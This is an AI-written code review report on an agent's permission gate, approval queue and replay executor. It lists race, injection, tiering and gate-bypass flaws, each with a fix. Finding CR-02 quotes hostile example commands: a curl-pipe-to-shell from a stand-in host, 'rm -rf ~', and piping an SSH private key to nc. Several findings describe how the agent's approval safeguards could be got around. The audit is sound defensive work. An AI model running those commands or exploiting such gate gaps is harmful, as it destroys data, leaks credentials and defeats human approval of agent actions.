---
phase: 03-permissions-autonomy
reviewed: 2026-06-24T15:24:53Z
depth: standard
files_reviewed: 31
files_reviewed_list:
  - migrations/v1.2.3/create-approval-queue.ts
  - migrations/version.json
  - src/agent.test.ts
  - src/agent.ts
  - src/approval-queue.test.ts
  - src/approval-queue.ts
  - src/bot.ts
  - src/dashboard.contract.test.ts
  - src/dashboard.ts
  - src/db.ts
  - src/gate.test.ts
  - src/gate.ts
  - src/kill-switches.ts
  - src/message-core.ts
  - src/orchestrator.ts
  - src/permissions-config.test.ts
  - src/permissions-config.ts
  - src/replay-executor.ts
  - src/routine-draft.ts
  - src/routine-runner.ts
  - src/scheduler.ts
  - src/security.ts
  - src/slack-bot.ts
  - web/src/components/ActionOverrideRow.tsx
  - web/src/components/ApprovalItem.tsx
  - web/src/components/AutonomyModeSelector.tsx
  - web/src/components/DailyLoop.tsx
  - web/src/components/LockedActionRow.tsx
  - web/src/lib/vocabulary.ts
  - web/src/pages/Home.tsx
  - web/src/pages/Settings.tsx
findings:
  critical: 2
  warning: 6
  info: 4
  total: 12
status: issues_found
---

# Phase 3: Code Review Report

**Reviewed:** 2026-06-24T15:24:53Z
**Depth:** standard
**Files Reviewed:** 31
**Status:** issues_found

## Summary

This phase replaces the old `bypassPermissions` agent mode with a real `canUseTool` gate, an approval queue, and a replay executor. The core gate logic (`classifyTier` / `resolveOutcome`) is sound: the Tier-4 lock is correctly placed *before* any mode/override branch (`gate.ts:124`), the kill-switch and classifier-throw paths both fail to the safe `ask` side, and `makeCanUseTool` never returns `updatedPermissions`. The DB dual-write (createSchema + versioned migration) is consistent, and the enqueue path stores only model-supplied params. The PUT `/api/permissions` route enum-validates mode and override values and refuses a Tier-4 `always`.

However, the review found two BLOCKERs that defeat phase-critical guarantees:

1. **The replay-once guard is bypassable under a race** — `replayApproval()` runs *before* the status-guarded `approve()`, so two concurrent approve clicks/polls both replay the captured tool call (double-send / double-charge) before either loses the status race. This is exactly the L-3 double-execution the phase set out to prevent.
2. **The Bash replay executor is a generic shell-exec sink** — `replayBash` runs *any* stored command string through `/bin/sh -c`, and the queue row's `tool_input` is operator-readable but not cryptographically bound to the gate decision; the "allowlist" is three tool names, not an allowlisted set of commands. Combined with the gate's coarse Tier-3 default for unknown Bash, this is a meaningful injection surface.

Six WARNINGs follow, the most important being that the Settings per-action override UI exposes capability keys (`draft`, `book`, `post`) that the gate never reads — the granular control it promises is non-functional, and toggling `send` silently enables every Tier-3 action at once.

Out-of-scope subsystems (`warroom-text-orchestrator.ts`, `warroom-text-router.ts`, `agent-voice-bridge.ts`, `memory-ingest.ts`) still bypass the gate; per the review brief this is noted (see IN-04) but not failed.

## Critical Issues

### CR-01: Replay runs before the status guard — concurrent approve double-executes the action

**File:** `src/dashboard.ts:3514-3535`
**Issue:** The approve route replays the captured tool call and *then* attempts the status-guarded transition:

```ts
const pending = listPending().find((r) => r.id === id);   // both racers see pending
if (!pending) return c.json({ ok: false, ... });
const replay = await replayApproval(pending.tool_name, pending.tool_input); // BOTH replay
const changed = approve(id, replay.message);              // only one wins the guard
```

`approve()` is correctly status-guarded (`approval-queue.ts:157-164`, `WHERE status='pending'`), but that guard only protects the DB row state — it does NOT protect the side-effecting `replayApproval()` call, which has already executed by the time the guard runs. Two concurrent approve requests (double-click, a dashboard click racing a future scheduler poll, or a retried fetch) both find the row `pending`, both call `replayApproval` → the email is sent twice / the invoice is paid twice / the file is written twice. For a Tier-3/4 queue whose entire purpose is "replay the captured action exactly once" (D-08, L-3), this defeats the guarantee. The code comment at 3509-3513 asserts this is safe ("a second approve finds no pending row, so approve() returns false ... WITHOUT replaying again") — that reasoning only holds if the two requests are serialized, which nothing here enforces.
**Fix:** Claim the row *before* replaying, so the status guard gates the side effect, not just the bookkeeping. Add a `claimForReplay(id)` that does `UPDATE ... SET status='replaying' WHERE id=? AND status='pending'` and returns `changes===1`; only the winner replays:

```ts
const claimed = claimForReplay(id); // UPDATE ... SET status='replaying' WHERE id=? AND status='pending'
if (!claimed) return c.json({ ok: false, error: 'already decided or in progress' });
const replay = await replayApproval(pending.tool_name, pending.tool_input);
finalizeApproval(id, replay.ok ? 'approved' : 'approved', replay.message); // record result
return c.json({ ok: true, replayed: replay.ok, result: replay.message });
```

Alternatively serialize approve handling through the existing `messageQueue` keyed on the approval id. Either way the replay must happen strictly after an atomic single-winner claim.

### CR-02: Bash replay is an unconstrained shell-exec of stored text; the "allowlist" does not constrain commands

**File:** `src/replay-executor.ts:60-116`
**Issue:** `replayApproval` dispatches on three tool *names* (`Write`, `Bash`, `mcp__*`), but `replayBash` then runs the stored `command` string verbatim through `spawn('/bin/sh', ['-c', command])` (`replay-executor.ts:99`). The module docstring claims "There is NO eval and NO shell metaprogramming" and that the command "was already classified + gated BEFORE it was queued," but that is not an integrity guarantee:
- The queue row's `tool_input` (`approval_queue.tool_input`) is a plain TEXT column that any holder of the dashboard token (or anything with DB write access) can edit between enqueue and approve. There is no signature/HMAC binding the stored params to the gate decision, so "the captured command" is trusted purely on storage. An operator-token-scoped attacker (the exact CSRF/leaked-token threat model the dashboard guards against elsewhere) can rewrite `tool_input.command` to `rm -rf ~` and then approve.
- `classifyBash` (`gate.ts:66-73`) only escalates a *known* destructive substring set to Tier 4 and defaults everything else to Tier 3. A Tier-3 Bash command (e.g. `curl evil.sh | sh`, `chmod 777 ...`, `cat ~/.ssh/id_rsa | nc ...`) is fully queueable and then replayed through `/bin/sh -c` with no further check. The replay executor re-runs it with the parent process env minus the SDK-scrubbed secrets — but `/bin/sh -c` still has full filesystem and network access.

So the security property "allowlisted tools only, no shell injection" is overstated: `Bash` *is* the shell, and replay re-grants it.
**Fix:** Treat replay as a privileged re-execution boundary, not a trusted passthrough:
1. Bind the stored params to the decision: store an HMAC of `{toolName, tool_input, tier, mode}` at enqueue time (keyed by `DB_ENCRYPTION_KEY`) and verify it before replay; refuse on mismatch.
2. Re-classify and re-resolve at replay time (`classifyTier(toolName, toolInput)` + `resolveOutcome`) and refuse to replay anything that now classifies Tier 4, so an edited row can't downgrade itself.
3. Consider refusing `Bash` replay entirely (the honest "re-run it from chat" path the module already uses for unknown tools) rather than re-opening a shell from a stored string. If `Bash` replay must stay, document that it inherits full shell capability and is gated solely by the dashboard token.

## Warnings

### WR-01: Settings per-action overrides use capability keys the gate never reads — granular control is non-functional

**File:** `web/src/pages/Settings.tsx:484-490` (and `src/gate.ts:99-110`)
**Issue:** The UI renders five override rows keyed `prepare`, `draft`, `send`, `book`, `post`. The gate resolves overrides by *one capability per tier* via `capabilityForTier` (`gate.ts:108`): Tier 1 → `prepare`, Tier 2 → `save`, Tier 3 → `send`, Tier 4 → `send-money`. Therefore:
- `draft` (Tier 1 in the UI) is never read — the gate keys Tier 1 on `prepare`. Toggling "Draft messages and docs" does nothing.
- `book` and `post` (Tier 3 in the UI) are never read — the gate keys Tier 3 on `send`. Toggling them does nothing.
- Conversely, flipping the single `send` row to "Always" silently auto-allows *every* Tier-3 action (send email, post publicly, book/move meetings) at once, contradicting the per-action mental model the UI sells ("Fine-tune by action").

This is a correctness + trust defect in a security UI: the operator believes they have allowed only "Book meetings" while having actually allowed all sends. PUT `/api/permissions` happily persists the dead keys (no whitelist of known capabilities), so they accumulate as misleading stored config.
**Fix:** Make the UI keys match the gate's capability model. Either (a) collapse the Tier-3 rows into the single `send` capability the gate honors, or (b) extend the gate to support per-action sub-capabilities and have `classifyTier` emit the finer key. Also add a known-capability allowlist to the PUT route so unknown keys (`draft`, `book`, `post`) 400 instead of silently persisting.

### WR-02: `routineAutonomy` is threaded into the gate but never consulted — D-06 distinction is a no-op

**File:** `src/gate.ts:153`, `src/routine-runner.ts:101-107`, `src/orchestrator.ts:156-160`
**Issue:** `GateContext.routineAutonomy` (`'unattended' | 'queue_approval'`) is set by the routine runner and carried through delegation, with comments claiming "each routine step enters the gate with its stored autonomy (D-06)." But `makeCanUseTool` and `resolveOutcome` never read `routineAutonomy` — a routine step's outcome is identical whether the routine is marked `unattended` or `queue_approval`. The stored autonomy choice (a Phase-2 feature the dashboard exposes) has no behavioral effect in Phase 3, despite the code/comments asserting it does. Either the field is dead code or the intended D-06 behavior was never implemented.
**Fix:** If `queue_approval` is meant to force the queue path even when the mode default would auto-allow (or `unattended` to suppress queueing), implement that branch in `resolveOutcome`/`makeCanUseTool`. Otherwise remove the field and the misleading comments so the codebase doesn't imply an enforced guarantee that isn't there.

### WR-03: `classifyTier` orders `/draft/i` (Tier 1) before send/post patterns — a "send-draft" tool auto-runs

**File:** `src/gate.ts:49,84-85`
**Issue:** `TIER1_MCP` includes `/draft/i` and is tested (`gate.ts:84`) *before* `TIER3_PATTERNS` (`gate.ts:85`). Any MCP tool whose name contains "draft" classifies as Tier 1 (auto-allow in every mode), including names like `mcp__gmail__send-draft`, `mcp__x__publish-draft`, or `mcp__mailer__send-draft-campaign`. A tool that actually *sends* a draft would silently auto-run under Balanced/Autonomous because "draft" matched first. The substring match is too broad for a Tier-1 (silent) classification.
**Fix:** Tighten the `draft` heuristic (anchor it, e.g. `/draft$/i` or `/__(create|save)[-_]?draft/i`) and/or move the Tier-3 send/post check ahead of the broad Tier-1 MCP verbs so an explicit send/post/publish always wins over a coincidental "draft" substring.

### WR-04: MCP replay never sends a `tools/list` check and trusts the server name split blindly

**File:** `src/replay-executor.ts:125-211`
**Issue:** `replayMcp` spawns the configured server and immediately calls `tools/call` with `{ name: tool, arguments: input }`. The `tool` name is `toolName.split('__').slice(2).join('__')` from the stored row. Because the row is editable (see CR-02) and the executor performs no `tools/list` validation, an edited row can invoke *any* tool the spawned server exposes — not just the one originally gated. E.g. a queued `mcp__drive__list-files` (Tier 1, auto-queued only if it ever asks) could be edited to `mcp__drive__delete-file` and replayed against the same server, since replay re-spawns the server with full configured env and calls whatever tool name is in the row. The gate classified `list-files`; replay executes `delete-file`.
**Fix:** Re-classify the (server, tool, input) at replay time and refuse Tier-4 / mismatched-tier replays (ties into CR-02 fix #2). At minimum, bind the tool name into the integrity check so an edited tool name fails verification before any server is spawned.

### WR-05: Inline-ask resolver is keyed only by `chatId` and is process-global — cross-turn/cross-agent collision

**File:** `src/message-core.ts:58,75-83,86-106`
**Issue:** `pendingInlineAsks` is a module-global `Map<chatId, ...>`. A single chatId can have only one pending inline ask, and the *next* message from that chat resolves it regardless of which agent/turn posted it. In the Slack multi-agent model (one process runs many agents, routed by channel) and in any case where a user fires a second message while an ask is pending, the resolution can bind to the wrong turn: the operator's unrelated next message ("ok thanks") is parsed as a `yes` and *approves a Tier-3/4 send they never saw the prompt for*. The `/^(yes|y|ok|sure|...)/i` matcher (`message-core.ts:80`) makes accidental approval easy ("ok let's move on" → approves). For a security gate this is an authorization-bypass-by-ambiguity risk.
**Fix:** Key pending asks by a per-turn token (chatId + turnId/runId) and include the captured action summary in the confirmation so the resolving message is unambiguously tied to a specific prompt. Consider requiring a stricter affirmation (e.g. exact "yes" or a generated short code) for Tier 4, and ignore affirmations that arrive after a short proximity window.

### WR-06: `decryptField` silently returns ciphertext-or-input on failure — tamper/format errors are swallowed

**File:** `src/db.ts:46-66`
**Issue:** `decryptField` returns the raw input unchanged on any decryption failure (wrong key, GCM auth-tag mismatch = tampering). The comment frames this as "graceful fallback for pre-encryption data," but it also means a tampered ciphertext (auth tag failure) is indistinguishable from legitimate plaintext and is returned silently. In a module that this phase leans on for the proposed HMAC/at-rest integrity (CR-02 fix), silent fallback undermines any integrity guarantee built on top of it. Not introduced by this phase, but load-bearing for it.
**Fix:** Distinguish "not in `iv:tag:ct` format" (legacy plaintext, return as-is) from "well-formed but auth-tag verification failed" (tampering — log a warning and return a sentinel / throw for callers that require integrity). Do not treat a GCM auth failure as benign plaintext.

## Info

### IN-01: Dashboard chat path is "conceptually attended" but wired as background — Tier-3/4 actions queue instead of asking inline

**File:** `src/bot.ts:1150-1153`
**Issue:** The dashboard chat `runAgent` call passes `{ attended: false }` with no `requestInline`, so a live dashboard chat that hits a Tier-3 action enqueues+denies rather than asking inline. The comment says this is intentional until "plan 04," and it fails safe (queue, never silent-allow), so it is not a defect — but the operator experience is inconsistent with the Telegram path (`message-core.ts:500`, attended) and worth tracking so it isn't forgotten.
**Fix:** Track the plan-04 wiring of `requestInline` for the dashboard transport; until then the queue-fallback is acceptable.

### IN-02: `@delegate` inline path omits gateCtx; attended delegations queue rather than asking inline

**File:** `src/message-core.ts:277-286`
**Issue:** In an attended chat, a `@agent: do X` delegation calls `delegateToAgent` without a `gateCtx`, so it inherits the safe background default — any Tier-3/4 action inside the delegated turn queues instead of asking the live operator inline. Fail-safe (queue, not silent-allow), but the operator sitting in chat gets a "queued for you" instead of an inline yes/no, which is a UX inconsistency, not a security hole.
**Fix:** If inline approval is desired for attended delegations, pass an attended `gateCtx` with a `requestInline` bound to the caller's transport.

### IN-03: PUT `/api/permissions` is not atomic — partial persistence on mid-loop failure

**File:** `src/dashboard.ts:3479-3484`
**Issue:** `setMode` then a loop of `setOverride` calls each write separately. If a `setDashboardSetting` throws partway, mode is persisted but overrides are partially applied, leaving config in a half-updated state (and the route then 500s via the global error handler). Low likelihood (SQLite KV write), but the config write is not transactional.
**Fix:** Wrap the mode + overrides writes in a single `db.transaction(...)`, or write overrides as one merged object after validating all entries.

### IN-04: Out-of-scope agent paths still bypass the gate (PERM-01 hole, acknowledged)

**File:** `src/warroom-text-orchestrator.ts`, `src/warroom-text-router.ts`, `src/agent-voice-bridge.ts`, `src/memory-ingest.ts` (not in this phase's file set)
**Issue:** Per the review brief, these subsystems still use `bypassPermissions` and were explicitly out of scope. They represent a real residual PERM-01 hole: an agent invocation through the war-room text/voice or memory-ingest paths does not route through `canUseTool`, so the Tier-4 lock and approval queue do not apply there. Flagged for visibility; not failing this phase.
**Fix:** Schedule a follow-up to route every `query()` call site through `buildAgentQueryOptions` / `makeCanUseTool`. Consider a lint/test that greps for `bypassPermissions` / `permissionMode: 'bypassPermissions'` and fails CI for any new occurrence.

---

_Reviewed: 2026-06-24T15:24:53Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
